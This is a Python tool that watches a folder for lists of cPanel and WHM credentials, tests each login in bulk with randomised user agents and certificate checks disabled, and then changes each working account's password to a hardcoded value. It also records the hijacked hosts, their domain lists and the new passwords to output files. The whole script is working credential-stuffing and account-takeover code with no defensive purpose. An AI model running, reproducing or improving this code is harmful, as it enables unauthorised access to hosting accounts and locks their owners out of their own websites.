import os
import sys
import asyncio
import httpx
from tqdm import tqdm
from urllib.parse import urlparse
from fake_useragent import UserAgent
from watchfiles import awatch, Change
import re
import uuid

# ───────── CONFIG ─────────
DOWNLOADS_DIR = "../Filter/Cpanel-Filter"  # Monitor Cpanel-Filter directly
CPANEL_VALID = "../results-cms/Cpanel"
STATE_FILE = "../results-cms/Cpanel/processed_files.txt"
STABILITY_DELAY = 1  # seconds between checks
STABILITY_TRIES = 1  # how many times size must stay the same
MAX_CONCURRENT = 30
TIMEOUT = 6
VALID_CPANEL_FILE = os.path.join(CPANEL_VALID, "Valid_Cpanel.txt")
CHANGED_PASS_FILE = os.path.join(CPANEL_VALID, "Changed_Pass.txt")
NEW_PASS = "SMnizar@0553"
ua = UserAgent()
cp_valid_count = 0
cp_invalid_count = 0
status_printed = False
processed_files = set()
os.makedirs(DOWNLOADS_DIR, exist_ok=True)
os.makedirs(CPANEL_VALID, exist_ok=True)

def HEADERS():
    return {
        "User-Agent": ua.random,
        "Referer": "",
        "Connection": "keep-alive"
    }

def update_status():
    global status_printed
    status_lines = [
        f"Valid Logins: {cp_valid_count}",
        f"Invalid Logins: {cp_invalid_count}"
    ]
    if status_printed:
        sys.stdout.write("\033[2A")
    else:
        status_printed = True
    for line in status_lines:
        sys.stdout.write(f"{line}\r\n")
    sys.stdout.flush()

def parse_entry(line):
    try:
        match = re.match(r'^(https?://)?([a-zA-Z0-9.-]+)(\:\d+)?(/.*)?:(.+):(.+)$', line.strip())
        if not match:
            tqdm.write(f"[!] Bad entry format: {line.strip()}")
            return None
        scheme, host, port, path, username, password = match.groups()
        if not scheme:
            scheme = "https://"
        base_url = f"{scheme}{host}"
        if port:
            base_url += port
        parsed = urlparse(base_url)
        if not parsed.scheme or not parsed.hostname:
            return None
        base_url = f"{parsed.scheme}://{parsed.hostname}"
        if parsed.port:
            base_url += f":{parsed.port}"
        return base_url.rstrip('/'), username, password
    except Exception as e:
        tqdm.write(f"[!] Parse error: {line.strip()} - {str(e)}")
        return None

async def get_domain_list(session_url, cookie):
    filemanager_url = f"{session_url}/frontend/jupiter/filemanager/index.html"
    headers = HEADERS()
    headers["Referer"] = session_url
    try:
        async with httpx.AsyncClient(timeout=TIMEOUT, verify=False) as client:
            response = await client.get(filemanager_url, headers=headers, cookies=cookie)
            if response.status_code == 200:
                match = re.search(r'<select id="ddlDomainSelect"[^>]*>(.*?)</select>', response.text, re.DOTALL)
                if match:
                    domains = re.findall(r'<option value="[^"]*">([^<]+)</option>', match.group(1))
                    return domains
            return []
    except Exception as e:
        tqdm.write(f"[!] Error retrieving domain list for {session_url}: {e}")
        return []

async def change_password(session_url, oldpass, newpass, cookie, entry, host):
    change_url = f"{session_url}/frontend/jupiter/passwd/changepass.html"
    data = {
        "oldpass": oldpass,
        "newpass": newpass,
        "newpass2": newpass,
        "enablemysql": "1",
        "B1": "Change your password now!"
    }
    headers = HEADERS()
    headers["Referer"] = session_url
    headers["Origin"] = session_url.split("/")[0] + "//" + session_url.split("/")[2]
    headers["Connection"] = "keep-alive"
    try:
        async with httpx.AsyncClient(timeout=TIMEOUT, verify=False) as client:
            response = await client.post(change_url, data=data, headers=headers, cookies=cookie)
            success_indicators = [
                '<meta http-equiv="refresh"',
                "password changed",
                "successfully changed"
            ]
            if response.status_code == 200 and any(indicator in response.text.lower() for indicator in success_indicators):
                with open(CHANGED_PASS_FILE, "a", encoding="utf-8", buffering=1) as cf:
                    cf.write(f"{entry}\n")
                    cf.flush()
                tqdm.write(f"[✓] cPanel password changed for {entry}")
                return True
            else:
                response_snippet = response.text[:200].replace("\n", " ")
                tqdm.write(f"[!] cPanel password change failed for {entry}: status={response.status_code}, response={response_snippet}")
                return False
    except Exception as e:
        tqdm.write(f"[!] cPanel password change error for {entry}: {str(e)}")
        return False

async def change_password_whm(session_url, newpass, cookie, entry, host, username):
    change_url = f"{session_url}/json-api/passwd"
    data = {
        "user": username,
        "password": newpass,
        "api.version": "1"
    }
    headers = HEADERS()
    headers["Referer"] = session_url
    headers["Origin"] = session_url.split("/")[0] + "//" + session_url.split("/")[2]
    headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
    headers["Connection"] = "keep-alive"
    try:
        async with httpx.AsyncClient(timeout=TIMEOUT, verify=False) as client:
            response = await client.post(change_url, data=data, headers=headers, cookies=cookie)
            success_indicators = [
                "Password changed for user",
                "success",
                "changed successfully"
            ]
            if response.status_code == 200 and any(indicator in response.text.lower() for indicator in success_indicators):
                with open(CHANGED_PASS_FILE, "a", encoding="utf-8", buffering=1) as cf:
                    cf.write(f"{entry}\n")
                    cf.flush()
                tqdm.write(f"[✓] WHM password changed for {entry}")
                return True
            else:
                reason = response.json().get("metadata", {}).get("reason", "Unknown error") if response.json() else "No success indicator in response"
                tqdm.write(f"[!] WHM password change failed for {entry}: {reason}")
                return False
    except Exception as e:
        tqdm.write(f"[!] WHM password change error for {entry}: {str(e)}")
        return False

async def check_login(url, username, password):
    global cp_valid_count, cp_invalid_count
    async with semaphore:
        login_url = url.split("/login")[0] + "/login/?login_only=1"
        data = {"user": username, "pass": password}
        entry = f"{url}:{username}:{NEW_PASS}"
        host = urlparse(url).netloc
        try:
            async with httpx.AsyncClient(timeout=TIMEOUT, verify=False) as client:
                headers = HEADERS()
                headers["Referer"] = login_url
                response = await client.post(login_url, data=data, headers=headers, follow_redirects=False)
                if response.status_code == 200 and response.json().get("status") == 1 and "/cpsess" in response.json().get("redirect", ""):
                    cp_valid_count += 1
                    response = await client.post(login_url, data=data, headers=headers, follow_redirects=False)
                    if response.status_code == 200 and response.json().get("status") == 1:
                        cpsess_path = response.json().get("security_token", response.json().get("redirect", "")).split("/")[1]
                        session_url = f"{url.split('/login')[0]}/{cpsess_path}"
                        cookie = {}
                        if hasattr(response.cookies, 'jar'):
                            cookie = {c.name: c.value for c in response.cookies.jar}
                        elif "Set-Cookie" in response.headers:
                            set_cookie = response.headers["Set-Cookie"]
                            for part in set_cookie.split(";"):
                                if "=" in part:
                                    name, value = part.split("=", 1)
                                    cookie[name.strip()] = value.strip()
                        if "cpsession" not in cookie:
                            cookie["cpsession"] = f"{username}%3a{cpsess_path.replace('cpsess', '')}"
                        if "whostmgrsession" not in cookie:
                            cookie["whostmgrsession"] = f"{username}%3a{cpsess_path.replace('cpsess', '')}"
                        if "timezone" not in cookie:
                            cookie["timezone"] = "Asia/Shanghai"
                        parsed = urlparse(url)
                        port = str(parsed.port) if parsed.port else "2083"
                        success = False
                        domains = []
                        if port == "2087":
                            success = await change_password_whm(session_url, NEW_PASS, cookie, entry, host, username)
                            output = f"{url}:{username}:{NEW_PASS} | WHM"
                        else:
                            domains = await get_domain_list(session_url, cookie)
                            success = await change_password(session_url, password, NEW_PASS, cookie, entry, host)
                            domain_count = len(domains)
                            domain_list_str = ", ".join(domains) if domains else "None"
                            output = f"{url}:{username}:{NEW_PASS if success else password}{' (UNCHANGED)' if not success else ''} | DOMAINS {domain_count} | {domain_list_str}"
                        with open(VALID_CPANEL_FILE, "a", encoding="utf-8", buffering=1) as vf:
                            vf.write(f"{output}\n")
                            vf.flush()
                    else:
                        tqdm.write(f"[!] Login failed for {entry}: Second login attempt unsuccessful")
                        cp_invalid_count += 1
                else:
                    cp_invalid_count += 1
                    tqdm.write(f"[!] Login failed for {entry}: Invalid response")
        except Exception as e:
            tqdm.write(f"[!] Login error for {entry}: {e}")
            cp_invalid_count += 1
        finally:
            update_status()

async def wait_until_stable(file_path: str) -> bool:
    prev_size = -1
    stable_count = 0
    while True:
        try:
            size = os.path.getsize(file_path)
        except FileNotFoundError:
            return False
        if size == prev_size:
            stable_count += 1
            if stable_count >= STABILITY_TRIES:
                return True
        else:
            stable_count = 0
            prev_size = size
        await asyncio.sleep(STABILITY_DELAY)

async def process_file(file_path: str):
    global cp_invalid_count
    try:
        stable = await wait_until_stable(file_path)
        if not stable:
            tqdm.write(f"[!] File {file_path} not stable or removed")
            return

        processed_lines = []
        with open(file_path, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.rsplit(":", 2)
                if len(parts) == 3:
                    url, username, password = parts
                    if not url.startswith(('http://', 'https://')):
                        url = f"https://{url}"
                        line = f"{url}:{username}:{password}"
                    processed_lines.append(line)
                else:
                    tqdm.write(f"[!] Skipped invalid line format: {line}")

        if processed_lines:
            tasks = []
            for line in processed_lines:
                parsed = parse_entry(line)
                if parsed:
                    tasks.append(check_login(*parsed))
                else:
                    tqdm.write(f"[!] Failed to parse line for login: {line}")
                    cp_invalid_count += 1
            if tasks:
                await asyncio.gather(*tasks)
            tqdm.write(f"[+] Processed file: {file_path} ({len(processed_lines)} lines processed)")

        processed_files.add(file_path)

    except Exception as e:
        tqdm.write(f"[!] Error processing {file_path}: {e}")

async def watch_folder():
    global processed_files, semaphore
    processed_files = set()
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, "r") as f:
            processed_files = set(line.strip() for line in f if line.strip())
    tqdm.write(f"👀 Watching folder: {DOWNLOADS_DIR}")
    async for changes in awatch(DOWNLOADS_DIR):
        for change, path in changes:
            if change == Change.added and os.path.isfile(path) and path not in processed_files and os.path.splitext(path)[1].lower() == '.txt':
                await process_file(path)
                with open(STATE_FILE, "a") as f:
                    f.write(f"{path}\n")

if __name__ == "__main__":
    try:
        for f in [VALID_CPANEL_FILE, CHANGED_PASS_FILE]:
            open(f, 'a').close()
        asyncio.run(watch_folder())
    except KeyboardInterrupt:
        tqdm.write("\n🛑 Monitoring stopped")
    finally:
        tqdm.write("🔌 Shutdown complete")